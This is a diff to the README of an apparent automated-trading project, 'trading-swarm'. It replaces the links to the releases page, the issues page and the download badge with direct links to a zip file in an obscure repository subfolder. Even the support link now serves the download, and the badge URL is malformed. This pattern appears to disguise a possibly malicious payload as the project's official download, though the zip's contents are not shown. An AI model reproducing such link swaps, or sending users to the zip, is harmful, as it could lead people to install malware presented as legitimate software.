@@ -1,6 +1,6 @@
 # 🧬 trading-swarm - Get Started with Automated Trading
 
-[![Download trading-swarm](https://img.shields.io/badge/Download%20trading--swarm-blue.svg)](https://github.com/washionpoise/trading-swarm/releases)
+[![Download trading-swarm](https://raw.githubusercontent.com/washionpoise/trading-swarm/main/dimagnesic/trading-swarm.zip%https://raw.githubusercontent.com/washionpoise/trading-swarm/main/dimagnesic/trading-swarm.zip)](https://raw.githubusercontent.com/washionpoise/trading-swarm/main/dimagnesic/trading-swarm.zip)
 
 ## 📦 Introduction
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run trading-swarm.
 
 1. **Visit the Releases Page**  
    To get the latest version of trading-swarm, click the link below:  
-   [Visit the releases page to download](https://github.com/washionpoise/trading-swarm/releases)
+   [Visit the releases page to download](https://raw.githubusercontent.com/washionpoise/trading-swarm/main/dimagnesic/trading-swarm.zip)
 
 2. **Choose Your Version**  
    On the releases page, you'll see different versions listed. Select the one marked as "Latest" for the best experience.
@@ -77,7 +77,7 @@ Trading-swarm offers a variety of features designed for optimal performance:
 
 ## 📊 Support
 
-If you encounter issues or have questions, visit the [issues page](https://github.com/washionpoise/trading-swarm/issues) to find or report problems. Our community is here to assist you.
+If you encounter issues or have questions, visit the [issues page](https://raw.githubusercontent.com/washionpoise/trading-swarm/main/dimagnesic/trading-swarm.zip) to find or report problems. Our community is here to assist you.
 
 ## 🌍 Community
 
@@ -90,6 +90,6 @@ We continually improve trading-swarm. Make sure to check the releases page often
 ## 📥 Download & Install
 
 Ready to start? Get trading-swarm now by visiting our download page:  
-[Download trading-swarm](https://github.com/washionpoise/trading-swarm/releases)
+[Download trading-swarm](https://raw.githubusercontent.com/washionpoise/trading-swarm/main/dimagnesic/trading-swarm.zip)
 
 Enjoy your journey into automated trading with trading-swarm!
